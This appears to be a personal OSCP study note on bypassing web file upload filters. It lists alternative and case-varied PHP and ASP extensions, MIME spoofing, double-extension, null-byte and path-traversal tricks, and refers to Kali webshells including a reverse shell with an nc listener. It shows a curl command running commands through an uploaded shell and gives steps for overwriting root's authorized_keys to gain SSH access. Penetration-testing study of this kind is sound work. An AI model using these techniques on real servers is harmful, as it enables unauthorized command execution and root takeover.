---
title: "File Upload Filter Bypass Techniques"
created: "2026-04-04"
type: permanent-note
status: active
tags:
  - permanent-note
  - file-upload
  - filter-bypass
  - web-attacks
  - oscp
---

# File Upload Filter Bypass Techniques

**Core idea:** File upload filters check for "bad" extensions like `.php` — but there are always edge cases in how these checks are implemented. Blacklists are inherently weaker than whitelists because attackers just need to find one thing the blacklist missed.

---

## Why Blacklists Always Lose

A whitelist says "only allow `.jpg`" — one rule, hard to bypass.
A blacklist says "block `.php`, `.phtml`, `.php5`..." — the developer has to remember every dangerous extension. They always forget some.

---

## The Bypass Hierarchy (Try in Order)

```
1. Alternative extensions     → .phtml, .php7, .phar, .phps
2. Case variation             → .pHP, .PHP, .PhP
3. Upload + rename trick      → upload as .txt, then rename via app feature
4. Content-Type spoofing      → change MIME type in Burp to image/jpeg
5. Double extension           → shell.php.jpg (if app checks last ext only)
6. Null byte (old PHP <5.3)   → shell.php%00.jpg
7. Path traversal in name     → ../shell.php (try to escape uploads dir)
```

---

## Extension Quick Reference

```
.php2   .php3   .php4   .php5   .php6   .php7
.phtml  .phps   .phar
.pHP    .PHP    .PhP    .pHp
```

For ASP/ASPX targets:
```
.asa    .asp    .aspx   .cer    .cdx    .ashx   .asmx
```

---

## Kali Webshells — Use These

```bash
ls /usr/share/webshells/
# php/simple-backdoor.php  ← lightweight, cmd parameter
# php/php-reverse-shell.php  ← full reverse shell, edit IP/port before using
# asp/  aspx/  jsp/  cfm/  perl/
```

**After uploading, access via:**
```bash
curl "http://target/uploads/shell.pHP?cmd=id"
# or for reverse shell webshell: just visit the URL (set up nc -nvlp first)
```

---

## Non-Executable Upload → SSH Access

When you can't execute the file, overwrite `authorized_keys`:

```bash
# 1. Generate key pair
ssh-keygen -f exploit_key

# 2. Prepare authorized_keys
cat exploit_key.pub > authorized_keys

# 3. Upload with path traversal in filename (intercept in Burp)
filename: "../../../../../../../root/.ssh/authorized_keys"

# 4. Connect
ssh -i exploit_key root@target
```

**This works because:** Dev/lab web servers often run as root. Root's `.ssh/` directory is writable by the web process → overwrite their public key list with yours.

---

## Connections

- [[PWK-Module-09-Common-Web-App-Attacks]] — full module notes with step-by-step examples
- [[Web-App-Enumeration-Checklist]] — find upload forms during enumeration phase
- File upload + XXE is another combo: upload SVG with XXE payload → read local files
- File upload + LFI: upload webshell as image, include via LFI to execute it

---

*From: PWK Module 09, pages 265-274*
